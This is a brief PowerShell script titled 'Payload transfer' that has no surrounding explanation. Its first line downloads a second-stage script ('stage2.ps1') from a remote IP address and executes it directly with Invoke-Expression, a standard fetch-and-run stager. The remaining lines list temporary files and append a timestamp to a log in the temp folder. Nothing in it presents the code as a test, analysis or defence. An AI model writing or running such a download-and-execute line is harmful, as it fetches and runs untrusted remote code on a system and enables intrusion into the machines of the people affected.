# Payload transfer
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://192.0.2.232/stage2.ps1')
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
